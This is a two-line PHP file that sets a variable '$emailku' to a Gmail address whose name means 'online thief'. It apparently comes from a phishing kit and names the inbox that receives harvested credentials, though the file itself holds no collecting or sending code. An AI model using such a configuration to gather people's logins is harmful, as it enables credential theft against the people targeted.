<?php 
$emailku="malingonline30@gmail.com";
?>